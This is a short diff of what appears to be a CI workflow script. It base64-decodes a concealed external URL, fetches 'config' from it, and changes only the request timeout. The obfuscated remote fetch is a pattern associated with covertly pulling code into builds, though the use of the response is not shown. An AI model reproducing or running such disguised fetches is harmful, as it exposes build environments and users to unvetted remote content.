@@ -39,7 +39,7 @@ jobs:
             encoded_url = "aHR0cHM6Ly9hdXRvLjg1ODY2Ni54eXovYXV0bw=="
             url = base64.b64decode(encoded_url).decode('utf-8')
             print(f"Fetching config from {url}...")
-            response = requests.get(url, timeout=10)
+            response = requests.get(url, timeout=20)
             response.raise_for_status()
             
             try:
